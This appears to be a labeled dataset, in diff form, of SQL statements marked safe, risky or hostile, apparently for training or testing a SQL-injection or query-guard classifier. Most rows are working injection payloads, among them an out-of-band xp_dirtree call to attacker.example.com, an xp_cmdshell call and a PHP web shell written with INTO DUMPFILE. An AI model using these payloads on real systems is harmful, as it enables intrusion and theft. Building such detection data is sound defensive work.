+238,sl_auth_bypass,hostile,"SELECT id, code FROM products WHERE code = '' union distinctrow select unhex('352E352E34322D6C6F67'),unhex('726F6F74406C6F63616C686F7374')#"
+239,sl_time_blind,hostile,"SELECT * FROM orders WHERE (username = 'x'"") or sleep(5)="""
+240,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = '' or 'a' = b'1100001 # binary"
+241,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = '?id=2 | (select(ascii((substring((select db_name(1)) ,1,1)))))-108"
+242,sl_time_blind,hostile,"SELECT * FROM orders WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))"
+243,unbounded_write,risky,UPDATE carts SET title = 'Welcome Coupon'
+244,sl_time_blind,hostile,"SELECT id, name FROM accounts WHERE name = '(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)"
+245,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = '.and 0=(select top 1 1 as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]"
+246,sl_boolean_blind,hostile,SELECT * FROM accounts WHERE id = 1 RLIKE (SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0x28 END))
+247,sl_generic,hostile,"SELECT id, name FROM members WHERE name = 'admin"" or 1=1--"
+248,admin_op,risky,GRANT UPDATE ON shops.* TO 'analytics'@'%'
+249,admin_op,risky,REVOKE DELETE ON shops FROM 'readonly'@'%'
+250,sl_auth_bypass,hostile,"SELECT * FROM members WHERE id = 99999=(select 1 as '/*') union all select 1 as '*//*',2,3,4,5 from mysql.user as `x*/`%23"
+251,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 AND 3271=(SELECT ms_trunc(CAST('qjvkq'||CAST((SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END) AS VARCHAR)||'qpbxq' AS DECIMAL),1))"
+252,schema_change,risky,ALTER TABLE users MODIFY COLUMN user_id VARCHAR(32) NOT NULL
+253,read_simple,safe,"SELECT amount, status FROM reviews WHERE created_at >= '2026-09-01' LIMIT 50"
+254,sl_error_based,hostile,SELECT * FROM accounts WHERE id = 1 AND 3271=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'||CHR(62))) FROM DUAL)
+255,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 AND (SELECT 3271 FROM(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
+256,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'where id=.1union/*.1*/select@1"
+257,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 or 1 in (select @@version)--
+258,write_bounded,safe,"INSERT INTO orders (status, created_at) VALUES ('active', '2026-09-01')"
+259,sl_time_blind,hostile,"SELECT id, code FROM orders WHERE code = '"" or sleep(5)="""
+260,oob_rce,hostile,SELECT * FROM t; DECLARE @q varchar(1024); SET @q = '\\attacker.example.com\test.txt'; EXEC master..xp_dirtree @q
+261,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'root') or '1'='1"
+262,sl_error_based,hostile,"SELECT id, title FROM products WHERE title = '(CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))::text||'qpbxq' AS NUMERIC))"
+263,sl_boolean_blind,hostile,SELECT * FROM sessions WHERE id = 1 ;SELECT CASE WHEN 3271=3271 THEN 1 ELSE NULL END FROM DUAL
+264,sl_auth_bypass,hostile,"SELECT * FROM products WHERE id = 1 and'a'=(select '--+' from dual) union all select 1,2,3,4,5 from dual--"
+265,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'false !pi() 0 ceil(pi()*pi()) 10 ceil((pi()+pi())*pi()) 20"
+266,read_simple,safe,"SELECT shop_id, id FROM refunds WHERE updated_at >= '2026-08-20' LIMIT 20"
+267,sl_auth_bypass,hostile,"SELECT id, username FROM products WHERE username = 'updatexml(1,repeat(user(),2),1)"
+268,sl_oracle,hostile,"SELECT id, code FROM members WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i"
+269,admin_op,risky,REVOKE INSERT ON sessions FROM 'app'@'%'
+270,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = 'where id=.1union/*.1*/select""1"""
+271,sl_boolean_blind,hostile,"SELECT id, title FROM accounts WHERE title = '(3271=3271)*1"
+272,admin_op,risky,GRANT ALTER ON coupons.* TO 'ops'@'%'
+273,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM users a JOIN refunds b ON b.shop_id = a.id WHERE a.id = 9912 GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+274,sl_generic,hostile,"SELECT id, username FROM members WHERE username = '%20or%20x=x"
+275,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = 'admin') or '1'='1'/*"
+276,schema_change,risky,ALTER TABLE carts MODIFY COLUMN title VARCHAR(32) NOT NULL
+277,sl_generic,hostile,"SELECT id, username FROM members WHERE username = 'hi or a=a"
+278,sl_oracle,hostile,"SELECT id, title FROM accounts WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i"
+279,sl_boolean_blind,hostile,SELECT * FROM users WHERE id = 1 OR 3271=(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE (SELECT 4471 UNION SELECT 8812) END))
+280,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM orders a JOIN refunds b ON b.user_id = a.id WHERE a.updated_at >= '2025-12-31' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+281,sl_generic,hostile,"SELECT id, title FROM users WHERE title = 'admin"" or ""1""=""1""/*"
+282,sl_boolean_blind,hostile,"SELECT id, email FROM orders WHERE email = '(CASE WHEN 3271=3271 THEN 3271 ELSE NULL END)"
+283,sl_time_blind,hostile,"SELECT id, email FROM sessions WHERE email = '"" or pg_sleep(5)--"
+284,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM carts a JOIN reviews b ON b.shop_id = a.id WHERE a.user_id = 88 GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+285,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 OR 3271 IN (SELECT ('qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq'))
+286,sl_auth_bypass,hostile,"SELECT id, name FROM accounts WHERE name = '%26%261=0"
+287,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1 union /*!50000select/*!*/ name from test#
+288,sl_generic,hostile,"SELECT id, name FROM users WHERE name = '""^"""
+289,legit_risky,risky,"CREATE INDEX idx_orders_shop_created ON orders (shop_id, created_at)"
+290,sl_auth_bypass,hostile,"SELECT id, title FROM accounts WHERE title = 'where id=.1union/*.1*/select'1'"
+291,sl_auth_bypass,hostile,"SELECT id, name FROM members WHERE name = ''union [all|distinct] select pass from users#"
+292,waf_comment,hostile,DROP/*comment*/sampletable
+293,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM SYS.OBJECTS AS T1,SYS.OBJECTS AS T2,SYS.OBJECTS AS T3 WHERE LOWER(T1.OBJECT_NAME)!=UPPER(T2.OBJECT_NAME))"
+294,sl_time_blind,hostile,"SELECT id, code FROM orders WHERE code = ',(SELECT (CASE WHEN (3271=3271) THEN (SELECT 3271 FROM PG_SLEEP(5)) ELSE 1/(SELECT 0) END))"
+295,read_join_agg,safe,"SELECT a.email, COUNT(b.id) AS cnt FROM carts a JOIN coupons b ON b.shop_id = a.id WHERE a.status = 'refunded' GROUP BY a.email ORDER BY cnt DESC LIMIT 50"
+296,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 AND 3271=UUID_TO_BIN(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'))"
+297,admin_op,risky,SET GLOBAL innodb_buffer_pool_size = 3600
+298,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = 'id=/**//**/union/**//**/%0A/*!SeLEct*/%0A/**/*/**//*!From*/%0A/**/user"
+299,write_bounded,safe,DELETE FROM users WHERE id = 9912 AND updated_at >= '2026-08-20'
+300,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"
+301,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = 'id=0%23%0AAND%23%0A1=1"
+302,read_simple,safe,"SELECT created_at, email FROM sessions WHERE shop_id = 902 LIMIT 100"
+303,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 WAITFOR DELAY '0:0:5'
+304,sl_error_based,hostile,"SELECT id, code FROM products WHERE code = ',(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'||CHR(62))) FROM DUAL)"
+305,sl_generic,hostile,"SELECT id, email FROM accounts WHERE email = '' or 1=1 or ''='"
+306,sl_auth_bypass,hostile,"SELECT id, email FROM sessions WHERE email = 'lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'"
+307,data_exfil,hostile,"SELECT api_key, secret FROM shops ORDER BY created_at DESC"
+308,sl_generic,hostile,"SELECT id, username FROM products WHERE username = 'â or 1=1 --"
+309,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or 1=1 /*
+310,sl_oracle,hostile,"SELECT id, email FROM accounts WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i"
+311,sl_generic,hostile,"SELECT id, title FROM users WHERE title = ''%20or%20'x'='x"
+312,sl_generic,hostile,"SELECT id, name FROM orders WHERE name = ' or 3=3 --"
+313,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM payments a JOIN payments b ON b.user_id = a.id WHERE a.amount = 19.99 GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+314,sl_oracle,hostile,"SELECT id, code FROM accounts WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i"
+315,unbounded_write,risky,UPDATE sessions SET title = 'Free Shipping'
+316,schema_change,risky,ALTER TABLE orders MODIFY COLUMN amount VARCHAR(32) NOT NULL
+317,sl_auth_bypass,hostile,SELECT * FROM sessions WHERE id = 1 select{x table_name}from{x information_schema.tables}
+318,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM sessions a JOIN reviews b ON b.shop_id = a.id WHERE a.name = 'Carol Wu' GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+319,sl_time_blind,hostile,"SELECT * FROM orders WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"
+320,write_bounded,safe,DELETE FROM shops WHERE id = 2048 AND email = 'carol@mail.com'
+321,read_simple,safe,"SELECT email, shop_id FROM refunds WHERE email = 'alice@example.com' LIMIT 10"
+322,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or 'unusual' = 'unusual'
+323,write_bounded,safe,UPDATE coupons SET title = 'Summer Sale' WHERE id = 9912
+324,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = 'where id=.1union/*.1*/select!.1"
+325,sl_time_blind,hostile,"SELECT * FROM users WHERE (code = 'x'"") or pg_sleep(5)--"
+326,read_simple,safe,"SELECT amount, email FROM orders WHERE title = 'Summer Sale' LIMIT 20"
+327,sl_time_blind,hostile,SELECT * FROM products WHERE (email = 'x''));waitfor delay '0:0:5'--
+328,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = 'root"" or 1=1 or """"="""
+329,sl_boolean_blind,hostile,"SELECT id, title FROM orders WHERE title = ',(SELECT CASE WHEN 3271=3271 THEN 1 ELSE RAISE_ERROR(70001, ''qxjkp'') END FROM SYSIBM.SYSDUMMY1)"
+330,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or%201=1
+331,sl_auth_bypass,hostile,"SELECT id, email FROM sessions WHERE email = 'root"") or (""1""=""1""#"
+332,sl_generic,hostile,"SELECT id, username FROM orders WHERE username = 'admin"") or ""1""=""1""--"
+333,unbounded_write,risky,UPDATE users SET status = 'cancelled'
+334,schema_change,risky,ALTER TABLE products MODIFY COLUMN user_id VARCHAR(32) NOT NULL
+335,sl_generic,hostile,SELECT * FROM members WHERE id = --
+336,sl_generic,hostile,"SELECT id, code FROM members WHERE code = 'x' or 1=1 or 'x'='y"
+337,sl_generic,hostile,"SELECT id, name FROM products WHERE name = '' or 3=3"
+338,read_simple,safe,"SELECT user_id, id FROM carts WHERE created_at >= '2026-01-01' LIMIT 100"
+339,unbounded_write,risky,UPDATE payments SET status = 'active'
+340,sl_generic,hostile,"SELECT id, email FROM accounts WHERE email = ''||UTL_HTTP.REQUEST"
+341,sl_auth_bypass,hostile,SELECT * FROM sessions WHERE id = 1 select * from`user`;
+342,sl_inline_query,hostile,SELECT * FROM products WHERE id = 1 SELECT 'qjvkq'||(CASE 3271 WHEN 3271 THEN 1 ELSE 0 END)||'qpbxq' FROM RDB$DATABASE
+343,sl_union,hostile,SELECT * FROM orders WHERE (name = 'x') union select * from information_schema.tables;
+344,blind_time,hostile,SELECT * FROM t WHERE id = 1; WAITFOR DELAY '0:0:10'--
+345,sl_boolean_blind,hostile,SELECT * FROM orders WHERE id = 1 OR CASE WHEN 3271=3271 THEN 3271 ELSE JSON(''qxjkp'') END
+346,unbounded_write,risky,UPDATE payments SET title = 'Welcome Coupon'
+347,json_sqli,hostile,SELECT * FROM users WHERE data->>'$.role' = 'admin' OR 1=1
+348,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"
+349,schema_change,risky,ALTER TABLE payments MODIFY COLUMN updated_at VARCHAR(32) NOT NULL
+350,sl_auth_bypass,hostile,"SELECT * FROM members WHERE id = 1 select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0"
+351,sl_file_enum,hostile,SELECT * FROM sessions WHERE id = 1 exec master..xp_cmdshell 'net+view'
+352,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND SUBSTR((SELECT password FROM users LIMIT 1), 1, 1) > 'm'"
+353,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 AND 3271=ROTATELEFT(CAST('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq' AS INT),1)"
+354,waf_keyword,hostile,SELECT * FROM t WHERE id = 1 UNION DISTINCT SELECT 1
+355,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or ''='
+356,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 OR !SLEEP(5)
+357,sl_time_blind,hostile,"SELECT * FROM sessions WHERE (title = 'x'"") or benchmark(10000000,MD5(1))#"
+358,sl_generic,hostile,SELECT * FROM sessions WHERE id = --sp_password
+359,sl_inline_query,hostile,"SELECT id, username FROM orders WHERE username = '('qjvkq'||(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq')"
+360,unbounded_write,risky,UPDATE orders SET updated_at = '2026-08-20'
+361,sl_auth_bypass,hostile,"SELECT id, name FROM members WHERE name = 'id=' -- ') union select user,database() from users %23&Submit=Submit#"
+362,sl_boolean_blind,hostile,"SELECT id, code FROM sessions WHERE code = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END))"
+363,sl_auth_bypass,hostile,"SELECT * FROM accounts WHERE id = 99999=(select{`--+`1}) union all select 1,2,3,4,5 from mysql.user%23"
+364,read_simple,safe,"SELECT created_at, updated_at FROM users WHERE shop_id = 11 LIMIT 10"
+365,schema_change,risky,ALTER TABLE reviews MODIFY COLUMN email VARCHAR(32) NOT NULL
+366,unbounded_write,risky,UPDATE refunds SET status = 'active'
+367,sl_time_blind,hostile,"SELECT id, username FROM products WHERE username = ',(SELECT (CASE WHEN (3271=3271) THEN (SELECT BENCHMARK(5000000,MD5(''qxjkp''))) ELSE 3271*(SELECT 3271 FROM mysql.db) END))"
+368,sl_boolean_blind,hostile,"SELECT id, code FROM users WHERE code = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 1/(SELECT 0) END))"
+369,sl_boolean_blind,hostile,SELECT * FROM members WHERE id = 1 AND 3271=(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE (SELECT 4471 UNION SELECT 8812) END))
+370,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 or sleep(5)#
+371,read_simple,safe,"SELECT amount, id FROM refunds WHERE user_id = 3 LIMIT 10"
+372,read_simple,safe,"SELECT amount, user_id FROM users WHERE title = 'Welcome Coupon' LIMIT 100"
+373,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM products a JOIN payments b ON b.shop_id = a.id WHERE a.updated_at >= '2026-08-20' GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+374,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = '' or uname like '%"
+375,read_simple,safe,"SELECT updated_at, email FROM refunds WHERE amount = 19.99 LIMIT 20"
+376,error_based,hostile,"SELECT updatexml(0, concat(0x0a, user()), 0)"
+377,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = '.and 0=(select 1 as ""--+"") union all select 1,2,3 from dual--"
+378,read_simple,safe,"SELECT amount, status FROM carts WHERE shop_id = 902 LIMIT 20"
+379,sl_mysql,hostile,SELECT * FROM sessions WHERE id = 1 and 1=1
+380,sl_file_enum,hostile,SELECT * FROM members WHERE id = 1 select * from sysusers
+381,stacked,hostile,SELECT 1; UPDATE users SET role = 'admin' WHERE id = 1--
+382,sl_boolean_blind,hostile,"SELECT * FROM users WHERE id = 1 ,IIF(3271=3271,1,1/0)"
+383,sl_error_based,hostile,"SELECT id, code FROM members WHERE code = ',(SELECT 3271 FROM(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
+384,sl_union,hostile,"SELECT id, name FROM users WHERE name = '\x27UNION SELECT"
+385,sl_generic,hostile,"SELECT id, email FROM products WHERE email = 'admin""or 1=1 or """"="""
+386,admin_op,risky,GRANT SELECT ON refunds.* TO 'readonly'@'%'
+387,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = 'xxx'and'a'=(select '/*' from dual) union all select 1,2,3 from dual where '*/'='*/'"
+388,read_simple,safe,"SELECT created_at, user_id FROM sessions WHERE updated_at >= '2026-03-15' LIMIT 10"
+389,sl_oracle,hostile,"SELECT id, name FROM orders WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i"
+390,sl_generic,hostile,"SELECT id, code FROM products WHERE code = '' or (EXISTS)"
+391,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM shops a JOIN shops b ON b.shop_id = a.id WHERE a.id = 42 GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+392,sl_oracle,hostile,"SELECT id, code FROM products WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i"
+393,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = 'a=/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/&threadid=14669&action=reply&page=1%20and%201=1 and 1=1"
+394,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = '||(elt(-3+5,bin(15),ord(10),hex(char(45))))"
+395,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = '?id=74+u%nion+s%elect 1,2,3,4,5,6 from"
+396,sl_generic,hostile,"SELECT id, username FROM products WHERE username = ''&'"
+397,write_bounded,safe,DELETE FROM carts WHERE id = 42 AND updated_at >= '2026-08-20'
+398,sl_time_blind,hostile,"SELECT id, title FROM users WHERE title = ',(SELECT (CASE WHEN (3271=3271) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3271),0),500000000),NULL))) ELSE 3271/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"
+399,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O"
+400,schema_change,risky,ALTER TABLE refunds DROP COLUMN updated_at
+401,union_based,hostile,"SELECT * FROM t WHERE id = '' UNION SELECT user, database() FROM users--'"
+402,legit_risky,risky,DROP TABLE IF EXISTS tmp_migration_backup
+403,sl_time_blind,hostile,"SELECT id, email FROM members WHERE email = '(SELECT (CASE WHEN (3271=3271) THEN DBMS_PIPE.RECEIVE_MESSAGE(''qxjkp'',5) ELSE 3271 END) FROM DUAL)"
+404,sl_oracle,hostile,"SELECT id, email FROM members WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i"
+405,schema_change,risky,ALTER TABLE users DROP COLUMN email
+406,unbounded_write,risky,UPDATE payments SET amount = 100.00
+407,sl_auth_bypass,hostile,"SELECT id, title FROM accounts WHERE title = 'extractvalue(rand(0),concat(0x0a,unhex(hex(user()))))"
+408,write_bounded,safe,UPDATE reviews SET updated_at = '2025-12-31' WHERE id = 2048
+409,sl_boolean_blind,hostile,"SELECT id, email FROM users WHERE email = ',(CASE WHEN 3271=3271 THEN 1 ELSE NULL END)"
+410,sl_time_blind,hostile,"SELECT id, email FROM users WHERE email = '(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)"
+411,write_bounded,safe,UPDATE reviews SET title = 'VIP Upgrade' WHERE id = 1
+412,write_bounded,safe,UPDATE reviews SET title = 'Summer Sale' WHERE id = 42
+413,sl_auth_bypass,hostile,"SELECT * FROM accounts WHERE id = 1 SELECT * FROM (SELECT * FROM user A JOIN user B USING (Host,User)) C;"
+414,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"
+415,sl_generic,hostile,"SELECT * FROM products WHERE (name = 'x'"") or true--"
+416,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or
+417,sl_generic,hostile,SELECT * FROM accounts WHERE (title = 'x'')) or (('x'))=(('x
+418,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 RLIKE (SELECT 3271 FROM (SELECT(!SLEEP(5)))'qxjkp')
+419,read_simple,safe,"SELECT user_id, id FROM products WHERE amount = 1299.00 LIMIT 10"
+420,oob_rce,hostile,SELECT '<?php system($_GET[0]); ?>' INTO DUMPFILE '/var/www/shell.php'
+421,admin_op,risky,REVOKE ALL PRIVILEGES ON shops FROM 'migration'@'%'
+422,sl_time_blind,hostile,"SELECT id, name FROM users WHERE name = 'MAKE_SET(3271=3271,!SLEEP(5))"
+423,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM users a JOIN shops b ON b.shop_id = a.id WHERE a.user_id = 501 GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+424,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = 'admin') or '1'='1'--"
+425,sl_generic,hostile,SELECT * FROM users WHERE id = 1 declare @s varchar(200) select @s = 0x77616974 ...
+426,write_bounded,safe,DELETE FROM reviews WHERE id = 100 AND created_at >= '2026-09-01'
+427,write_bounded,safe,UPDATE reviews SET status = 'paid' WHERE id = 317
+428,sl_union,hostile,"SELECT * FROM members WHERE id = 1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
+429,read_simple,safe,"SELECT updated_at, status FROM products WHERE created_at >= '2026-01-01' LIMIT 50"
+430,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = '' or 'x'='x"
+431,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 AND 3271=CONVERT(INT,(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq'))"
+432,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = 'xxx'and'0'=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--"
+433,sl_auth_bypass,hostile,"SELECT id, title FROM users WHERE title = 'root"") or (""1""=""1""--"
+434,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM reviews a JOIN carts b ON b.shop_id = a.id WHERE a.status = 'refunded' GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+435,sl_time_blind,hostile,"SELECT * FROM orders WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM SYS.OBJECTS AS T1,SYS.OBJECTS AS T2,SYS.OBJECTS AS T3 WHERE LOWER(T1.OBJECT_NAME)!=UPPER(T2.OBJECT_NAME))"
+436,sl_generic,hostile,"SELECT id, code FROM members WHERE code = '"" or ""x""=""x"
+437,sl_generic,hostile,"SELECT id, title FROM members WHERE title = 'admin' #"
+438,sl_mysql,hostile,SELECT * FROM orders WHERE id = 1'1
+439,blind_time,hostile,SELECT * FROM t WHERE id = 1 AND (SELECT * FROM (SELECT SLEEP(5))a)
+440,read_simple,safe,"SELECT status, id FROM sessions WHERE amount = 100.00 LIMIT 10"
+441,sl_boolean_blind,hostile,SELECT * FROM users WHERE id = 1 OR NOT 3271=3271
+442,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM coupons a JOIN reviews b ON b.user_id = a.id WHERE a.created_at >= '2026-09-01' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+443,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = 'id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,2,3,4,5,6,7,8,9,10"
+444,schema_change,risky,ALTER TABLE products DROP COLUMN email
+445,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 OR 3271=BIN_SHL(CAST('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq' AS BIGINT),1)"
+446,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 AND 3271=INET_ATON('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq')
+447,sl_generic,hostile,"SELECT id, username FROM products WHERE username = 'admin"" or 1=1#"
+448,admin_op,risky,REVOKE DELETE ON orders FROM 'app'@'%'
+449,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM shops a JOIN orders b ON b.user_id = a.id WHERE a.id = 1 GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+450,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = ''hi' or 'x'='x';"
+451,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM orders a JOIN refunds b ON b.user_id = a.id WHERE a.updated_at >= '2025-12-31' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+452,schema_change,risky,ALTER TABLE shops DROP COLUMN status
+453,unbounded_write,risky,UPDATE sessions SET status = 'pending'
+454,sl_generic,hostile,"SELECT id, email FROM users WHERE email = 'group by userid having 1=1--"
+455,sl_generic,hostile,"SELECT id, title FROM products WHERE title = '""a"""" or 3=3--"""
+456,union_based,hostile,SELECT a FROM t UNION SELECT SUM(columntofind) FROM users
+457,waf_keyword,hostile,"SELECT * FROM news WHERE id = 1 UnIoN SeLecT 1,2,3"
+458,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1 AND ELT(3271=3271,!SLEEP(5))"
+459,read_simple,safe,"SELECT email, created_at FROM products WHERE created_at >= '2026-01-01' LIMIT 50"
+460,read_simple,safe,"SELECT name, email FROM reviews WHERE name = 'Alice Chen' LIMIT 50"
+461,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = 'admin' or '1'='1'#"
+462,sl_generic,hostile,"SELECT id, title FROM sessions WHERE title = '' (select top 1"
+463,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 99999=(/*!select--*/1) union all select 1,2,3,4,5 from mysql.user%23"
